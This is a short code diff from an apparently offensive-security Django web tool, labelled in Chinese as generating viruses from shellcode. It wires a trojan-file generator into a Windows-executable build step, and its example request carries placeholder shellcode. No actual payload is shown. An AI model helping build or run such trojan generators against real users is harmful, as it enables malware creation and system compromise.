@@ -6,6 +6,7 @@ import os
 import yaml
 from ClassCongregation import ErrorLog,GetTempFilePath,GetTrojanFilePath,GetTrojanModulesFilePath
 from Web.WebClassCongregation import UserInfo,TrojanData
+from Web.TrojanOrVirus.GenerateTrojanFiles import CreateTrojanFiles
 from django.http import JsonResponse
 from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
 from ClassCongregation import randoms
@@ -68,7 +69,7 @@ def GetTrojanPlugins(request):#获取用户当前木马插件
 {
 	"token": "xxx",
 	"shellcode_type": "xxx",
-	"shellcode":"\xdb\xdb\xdb\xdb\xdb\xdb",
+	"shellcode":"\\xdb\\xdb\\xdb\\xdb\\xdb\\xdb",
 	"trojan_modules":{"xx":["xx","xxx"],"xx2":["xx2","xxx2"]}
 }
 """
@@ -93,7 +94,7 @@ def ShellcodeToTrojan(request):#shellcode转换生成病毒
                     pass#windows的暂时没测试
                 elif sys.platform == "linux":
                     CFile = open(VirusOriginalFilePath, "w+")
-                    CFile.write("")#获取生成代码后写入文件中
+                    CFile.write(CreateTrojanFiles(shellcode=Shellcode,trojan_modules=TrojanModules))#获取生成代码后写入文件中
                     CFile.close()
                     Command="i586-mingw32msvc-gcc -mwindows " + VirusOriginalFilePath + " -o " + VirusFileGenerationPath
                     RedisCompileCodeTask=CompileCode.delay(Command)
